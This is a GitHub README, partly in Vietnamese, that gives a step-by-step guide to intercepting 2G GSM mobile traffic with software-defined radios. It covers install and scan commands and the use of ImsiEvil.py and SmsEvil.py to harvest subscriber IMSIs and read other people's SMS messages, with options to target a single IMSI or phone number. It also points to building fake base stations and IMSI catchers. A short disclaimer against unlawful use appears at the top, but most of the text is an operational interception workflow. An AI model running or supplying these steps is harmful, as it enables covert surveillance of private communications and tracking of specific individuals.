# Read_Sms_Hacking
Đọc tin nhắn của mạng đi động 2G-4G.

Bài viết nhằm mục đích giúp bạn đọc hiểu hơn về mạng di động, các công cụ đo lường tín hiệu mạng di động, các công cụ phân tích và đọc gói tin tcp/ip \
Bạn đọc lập trình không nên sử dụng kiến thức của mình vào các mục đích trái pháp luật.

Mạng 2G-4G khi gửi tin nhắn xuống thẻ Sim đã được mã hóa tiêu tuân chuẩn GSM. Vì Sim có bộ nhớ thấp nên việc tích hợp các loại mã hóa phức tạp vẫn chưa được thành công, chỉ cần một thiết bị bắt đúng giải tần số của BTS và thực hiện giải mã bằng software là có thể đọc được tin nhắn, nghe được audio thoại của kênh.

Các thiết bị IOT như cửa cuốn, khóa xe ô tô, xe máy... cũng có thể bị hack bằng cách tương tự này.

  <p align="center">
    <img src="https://www.paladion.net/hs-fs/hubfs/Paladion--2019/resources/blogs/How%20to%20Build%20an%20IMSI%20Catcher/3.jpg?width=527&name=3.jpg" style="max-width:100%;max-height:100%;" />
  </p>

**Hacker cũng có thể tạo ra những trạm BTS giả mạo chưa tới 600$, hoặc sử dụng các thiết bị IMSI catcher** <br/>
https://jurnal-singkat.blogspot.com/2016/04/building-portable-gsm-bts-using-nuand.html

# Công cụ phần mềm
```
kalibrate-rtl hoặc kalibrate-hackrf: công cụ quét dãy tần số GSM, xác định trạm BTS trong khu vực có tín hiệu mạnh
gr-gsm: công cụ thu và xử lý tín hiệu GSM
Wireshark: công cụ thu nhận dữ liệu mạng từ gr-gsm xử lý
gqrx: công cụ thu tín hiệu từ SDR
```

# Công cụ phần cứng: có thể dùng một trong các RTL-SDR, Hackrf, USRP, Blade-RF
```
https://www.paladion.net/blogs/how-to-build-an-imsi-catcher-to-intercept-gsm-traffic
Khi cắm thiết bị phần cứng vào cổng usb hoặc RS thì sẽ xuất hiện thêm card mạng mới, kiểm tra bằng lệnh lsusb sẽ thấy.
gqrx có nhiệm vụ thu tín hiệu từ thiết bị vào card mạng mới này
```

# Setup

```
sudo apt-get install python-pyshark
Gói pyshark để đọc các gói tin trong card mạng, vd bên dưới để đọc các payload http
https://medium.com/@vworri/extracting-the-payload-from-a-pcap-file-using-python-d938d7622d71
```

Install Gr GSM :  ( For receiving GSM transmissions )
```
sudo add-apt-repository -y ppa:ptrkrysik/gr-gsm
sudo apt-get update
sudo apt-get install gr-gsm
```

If gr-gsm failled to setup. Than follow those this : https://github.com/ptrkrysik/gr-gsm/wiki/Installation  

Install Kalibrate : ( For finding frequencies )
```
sudo apt install build-essential libtool automake autoconf librtlsdr-dev libfftw3-dev
git clone https://github.com/steve-m/kalibrate-rtl
cd kalibrate-rtl
./bootstrap && CXXFLAGS='-W -Wall -O3'
./configure
make
sudo make install
```
# Usage
You need gsm frequency on which you capture sms or imsi. By using kalibrate you will get all your near gsm base stations  frequencies.
```
kal -s GSM900
```
```
kal: Scanning for GSM-900 base stations.
GSM-900:
	chan: 4 (935.8MHz + 320Hz)	power: 1829406.95
	chan: 11 (937.2MHz + 308Hz)	power: 4540354.88
...
```
Now you need to capture gsm traffic using gr-gsm on frequency of your any gsm base station which you get from kalibrate.
```
grgsm_livemon -f <your_frequency>M
```
Example :
```
grgsm_livemon -f 935.8M
```
if you see output that's mean you getting gsm packets than continue other setps else change frequency.
```
2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b
2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b
2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b
2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b
...
```
Now every thing is ready you can start now capturing sms or imsi numbers using gsmevil.
You able to run imsi catcher and sms sniffer both at same time using 2 seprate terminal for capture imsi numbers and sms both at same time.
```
#### Capturing IMSI :
```
python ImsiEvil.py 
```
Options :
```
python ImsiEvil.py -h
Usage: ImsiEvil.py: [options]

Options:
  -h, --help            show this help message and exit
  -i IFACE, --iface=IFACE Interface (default : lo)
  -p PORT, --port=PORT  Port (default : 4729)
  -m IMSI, --imsi=IMSI  IMSI to track (default : None, Example: 123456789101112)
  -s SAVE, --save=SAVE  Save all imsi numbers to sqlite file. (default : None)
```
For save all imsi numbers with details in sqlite file.(It's will show you output on screen and also save in file)
```
python ImsiEvil.py -s example.db
```
For capture only specific imsi. (It's will show you only your given imsi result)
```
python ImsiEvil.py -m imsi_here (Example: python ImsiEvil.py -m 123456789101112)
```
#### Capturing SMS :

Run this command to quick start sms capturing.
```
python SmsEvil.py 
```
Options :
```
python SmsEvil.py -h
Usage: SmsEvil.py: [options]

Options:
  -h, --help            show this help message and exit
  -i IFACE, --iface=IFACE Interface (default : lo)
  -p PORT, --port=PORT  Port (default : 4729)
  -n NUMBER, --number=NUMBER Phone number (default : None)
  -s SAVE, --save=SAVE  Save all text messages to sqlite file. (default : None)
```
For save all sms in sqlite file.(It's will show you output on screen and also save in file)
```
python SmsEvil.py -s example.db
```
For capture only specific phone number sms. (It's will show you only your given phone number result)
```
python SmsEvil.py -n phone_number_here (Example: python SmsEvil.py -n 12345678910)
```

# Links 
Frequency : https://www.worldtimezone.com/gsm.html or https://en.wikipedia.org/wiki/GSM_frequency_bands
Sdr : https://en.wikipedia.org/wiki/Software-defined_radio
Sms : https://en.wikipedia.org/wiki/SMS#GSM
Imsi : https://fr.wikipedia.org/wiki/International_Mobile_Subscriber_Identity
Cell id : https://en.wikipedia.org/wiki/Cell_ID or https://unwiredlabs.com/
GSM : https://en.wikipedia.org/wiki/GSM
Frequency Calculator : https://www.cellmapper.net/arfcn
GR-GSM : https://github.com/ptrkrysik/gr-gsm
